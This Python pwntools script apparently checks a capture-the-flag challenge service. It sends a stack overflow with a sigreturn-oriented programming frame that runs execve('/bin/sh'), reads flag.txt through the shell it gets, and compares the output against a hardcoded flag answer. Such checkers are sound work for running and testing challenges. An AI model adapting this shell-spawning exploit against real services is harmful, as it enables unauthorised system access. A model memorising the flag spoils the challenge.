from pwn import *


def check_pwn_srop(host):
    set_rax = p64(0x40118C)
    syscall = p64(0x40117E)

    try:
        pc = connect(host, 9006, timeout=3)
    except:
        print("ERR 2 : Can't connec to the Server")
        return 2

    try:
        buff = pc.recvuntil("\n")[7:-1]
        buff = int(buff, 16)
        print("@buff : " + hex(buff))

        frame = SigreturnFrame(arch="amd64")
        frame.rax = 0x3B
        frame.rdi = buff
        frame.rip = u64(syscall)

        payload = b"/bin/sh\x00"
        payload += b"A" * 64
        payload += set_rax
        payload += syscall
        payload += bytes(frame)

        print(pc.recvuntil("\n"))
        pc.send(payload)
        pc.sendline("ls")
        pc.sendline("cat flag.txt")
        flag = pc.recvall(timeout=5)
        if b"FLAG{0v3rwr173_r361573r5_45_y0u_l1k3}" not in flag:
            print("ERR 1 :  Can't get  the flag")
            return 1
        print("No problem")
        return 0

    except Exception as e:
        print(e)
        return 1

    finally:
        pc.close()


if __name__ == "__main__":
    print(check_pwn_srop("localhost"))
